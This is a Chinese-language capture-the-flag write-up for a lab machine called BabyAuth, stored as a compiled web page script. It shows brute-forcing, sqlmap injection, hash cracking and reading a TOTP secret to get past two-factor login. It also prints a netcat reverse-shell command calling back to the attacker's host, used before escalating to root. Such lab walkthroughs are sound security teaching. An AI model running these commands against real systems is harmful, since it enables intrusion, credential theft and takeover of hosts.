(window.webpackJsonp=window.webpackJsonp||[]).push([[151],{514:function(s,a,t){"use strict";t.r(a);var e=t(11),r=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"babyauth-靶机渗透测试报告"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#babyauth-靶机渗透测试报告"}},[s._v("#")]),s._v(" BabyAuth 靶机渗透测试报告")]),s._v(" "),a("h2",{attrs:{id:"_1-信息收集"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-信息收集"}},[s._v("#")]),s._v(" 1. 信息收集")]),s._v(" "),a("h3",{attrs:{id:"_1-1-主机发现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-1-主机发现"}},[s._v("#")]),s._v(" 1.1 主机发现")]),s._v(" "),a("p",[s._v("使用 "),a("code",[s._v("arp-scan")]),s._v(" 扫描目标网络，发现靶机 IP 地址：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" arp-scan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-I")]),s._v(" eth1 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.0/24\n\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.1    0a:00:27:00:00:11       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Unknown: locally administered"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.130  08:00:27:3d:ed:bf       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Unknown"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("结果：")])]),s._v(" "),a("ul",[a("li",[a("code",[s._v("192.168.56.130")]),s._v(" - 目标主机")])]),s._v(" "),a("h3",{attrs:{id:"_1-2-端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-端口扫描"}},[s._v("#")]),s._v(" 1.2 端口扫描")]),s._v(" "),a("p",[s._v("使用 Nmap 进行 TCP 全端口扫描：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sT")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.130\n\nPORT   STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[a("strong",[s._v("开放服务：")])]),s._v(" "),a("ul",[a("li",[a("code",[s._v("22/tcp")]),s._v(" - SSH 服务")]),s._v(" "),a("li",[a("code",[s._v("80/tcp")]),s._v(" - HTTP 服务")])]),s._v(" "),a("h2",{attrs:{id:"_2-web-应用渗透"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-web-应用渗透"}},[s._v("#")]),s._v(" 2. Web 应用渗透")]),s._v(" "),a("h3",{attrs:{id:"_2-1-初始访问"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-1-初始访问"}},[s._v("#")]),s._v(" 2.1 初始访问")]),s._v(" "),a("p",[s._v("访问 Web 服务发现登录页面：")]),s._v(" "),a("div",{staticClass:"language-text line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("http://192.168.56.130/login.php\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"_2-2-密码爆破"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-2-密码爆破"}},[s._v("#")]),s._v(" 2.2 密码爆破")]),s._v(" "),a("p",[s._v("扔burp里用 "),a("code",[s._v("rockyou.txt")]),s._v(" 字典对登录接口进行爆破，成功获取凭据：")]),s._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token request-line"}},[a("span",{pre:!0,attrs:{class:"token method property"}},[s._v("POST")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token request-target url"}},[a("span",{pre:!0,attrs:{class:"token path"}},[a("span",{pre:!0,attrs:{class:"token path-separator"}},[s._v("/")]),s._v("login.php")])]),s._v(" "),a("span",{pre:!0,attrs:{class:"token http-version property"}},[s._v("HTTP/1.1")])]),s._v("\nusername=admin&password=iloveyou\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-babyauth/1.png",alt:""}})]),s._v(" "),a("p",[a("strong",[s._v("有效凭据：")])]),s._v(" "),a("ul",[a("li",[s._v("用户名："),a("code",[s._v("admin")])]),s._v(" "),a("li",[s._v("密码："),a("code",[s._v("iloveyou")])])]),s._v(" "),a("h3",{attrs:{id:"_2-3-sql-注入漏洞利用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-3-sql-注入漏洞利用"}},[s._v("#")]),s._v(" 2.3 SQL 注入漏洞利用")]),s._v(" "),a("p",[s._v("登录后访问 "),a("code",[s._v("admin.php")]),s._v(" 页面，发现搜索功能存在 SQL 注入漏洞。")]),s._v(" "),a("p",[s._v("登录后，拿个cookie，使用 SQLMap 进行自动化注入：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 枚举数据库")]),s._v("\nsqlmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://192.168.56.130/admin.php?search=Admin"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--cookie")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PHPSESSID=oatj35lo1c7a0vvt2pj0l8hcnk"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" search "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--dbs")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--batch")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 枚举表结构")]),s._v("\nsqlmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://192.168.56.130/admin.php?search=Admin"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--cookie")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PHPSESSID=oatj35lo1c7a0vvt2pj0l8hcnk"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" search "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-D")]),s._v(" target_db "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--tables")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--batch")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-babyauth/2.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-babyauth/3.png",alt:""}})]),s._v(" "),a("p",[a("strong",[s._v("获取的关键信息：")])]),s._v(" "),a("ol",[a("li",[a("strong",[s._v("隐藏目录：")])])]),s._v(" "),a("p",[s._v("path表信息")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://192.168.56.130/admin.php?search=Admin"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--cookie")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PHPSESSID=oatj35lo1c7a0vvt2pj0l8hcnk"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" search "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-D")]),s._v(" target_db "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-T")]),s._v(" path "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--dump")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--batch")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Table")]),s._v(": path\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("-----------------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" secret_path                       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("-----------------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("var"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("www"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("html"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("SsssssssuperSecret"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("-----------------------------------+")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-babyauth/4.png",alt:""}})]),s._v(" "),a("ol",[a("li",[a("strong",[s._v("用户凭据：")])])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sqlmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://192.168.56.130/admin.php?search=Admin"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--cookie")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PHPSESSID=oatj35lo1c7a0vvt2pj0l8hcnk"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" search "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--dbs")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--batch")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-D")]),s._v(" target_db --tables"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Database")]),s._v(": target_db\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Table")]),s._v(": credit\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" entry"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("----------------------------------+----------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" password                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" username "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("----------------------------------+----------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ff5e66b76340c5636aa40e7c6a46628f "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" lingmj   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("----------------------------------+----------+")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h3",{attrs:{id:"_2-4-密码破解"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-4-密码破解"}},[s._v("#")]),s._v(" 2.4 密码破解")]),s._v(" "),a("p",[s._v("对 MD5 哈希 "),a("code",[s._v("ff5e66b76340c5636aa40e7c6a46628f")]),s._v(" 进行彩虹表攻击，成功破解：")]),s._v(" "),a("ul",[a("li",[s._v("明文密码："),a("code",[s._v("xiaomi")])])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-babyauth/5.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_3-权限提升"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-权限提升"}},[s._v("#")]),s._v(" 3. 权限提升")]),s._v(" "),a("h3",{attrs:{id:"_3-1-目录爆破"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-1-目录爆破"}},[s._v("#")]),s._v(" 3.1 目录爆破")]),s._v(" "),a("p",[s._v("使用 Gobuster 发现隐藏目录中的文件：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("gobuster "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://192.168.56.130/SsssssssuperSecret/ "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-x")]),s._v(" php,html,asp,txt,bak\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-babyauth/6.png",alt:""}})]),s._v(" "),a("p",[a("strong",[s._v("发现文件：")])]),s._v(" "),a("ul",[a("li",[a("code",[s._v("/index.html")]),s._v(" - 空白页")]),s._v(" "),a("li",[a("code",[s._v("/user.txt")]),s._v(" - flag")]),s._v(" "),a("li",[a("code",[s._v("/shell.php")]),s._v(" - Web Shell")])]),s._v(" "),a("h3",{attrs:{id:"_3-2-初始访问"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-初始访问"}},[s._v("#")]),s._v(" 3.2 初始访问")]),s._v(" "),a("p",[s._v("通过 Web Shell 获得 "),a("code",[s._v("www-data")]),s._v(" 权限的初始立足点。")]),s._v(" "),a("h3",{attrs:{id:"_3-3-信息收集"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-3-信息收集"}},[s._v("#")]),s._v(" 3.3 信息收集")]),s._v(" "),a("p",[a("s",[s._v("有一说一，这个shell也太漂亮了")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-babyauth/7.png",alt:""}})]),s._v(" "),a("p",[s._v("在系统中发现 Google Authenticator 配置文件：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("www-data@BabyAuth:…/html/SsssssssuperSecret"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ls -alh /opt")]),s._v("\ntotal 12K\ndrwxr-xr-x  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" root root "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v(" 06:43 "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\ndrwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),s._v(" root root "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Mar "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("\n-r--r--r--  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root root  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("141")]),s._v(" Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v(" 06:43 .google_authenticator\n\nwww-data@BabyAuth:…/html/SsssssssuperSecret"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# cat /opt/.goo*")]),s._v("\nWETZMYJW52CMYLCZIX4EJ4HACQ\n"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('" RATE_LIMIT 3 30 1762429231 1762429249\n"')]),s._v(" WINDOW_SIZE "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("17")]),s._v('\n" TOTP_AUTH\n'),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("66503223")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("88483022")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("74570865")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29377535")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29891329")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[a("strong",[s._v("获取 TOTP 密钥：")])]),s._v(" "),a("div",{staticClass:"language-text line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("WETZMYJW52CMYLCZIX4EJ4HACQ\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"_3-4-双因子认证绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-4-双因子认证绕过"}},[s._v("#")]),s._v(" 3.4 双因子认证绕过")]),s._v(" "),a("p",[s._v("使用 "),a("code",[s._v("oathtool")]),s._v(" 生成有效的验证码：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('oathtool -b --totp "WETZMYJW52CMYLCZIX4EJ4HACQ"\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("生成验证码：")]),s._v(" "),a("code",[s._v("190513")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-babyauth/8.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"_3-5-root-权限获取"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-5-root-权限获取"}},[s._v("#")]),s._v(" 3.5 Root 权限获取")]),s._v(" "),a("p",[s._v("使用收集到的凭据和验证码切换到 root 用户，"),a("code",[s._v("su - root")]),s._v("需要交互式输入验证码和密码，反弹个shell")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("busybox "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.100 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" /bin/bash\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("简单稳定下shell")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("www-data@BabyAuth:/$ /usr/bin/script "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-qc")]),s._v(" /bin/bash /dev/null\nwww-data@BabyAuth:/$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("export")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("TERM")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("xterm\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 改善效果：")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# - 获得完整的终端模拟")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# - 支持命令补全(Tab键)")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# - 支持上下键历史记录")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# - Ctrl+C正常终止程序")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# - 支持颜色显示")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# - 可以运行vim, nano等交互程序")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# - 正确的行编辑功能")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" - root\nVerification code: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("190513")]),s._v("\nPassword: xiaomi\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-babyauth/9.png",alt:""}})]),s._v(" "),a("p",[a("strong",[s._v("结果：")]),s._v(" 成功获得 root 权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("root@BabyAuth:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# id")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("uid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("gid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("groups")]),a("span",{pre:!0,attrs:{class:"token 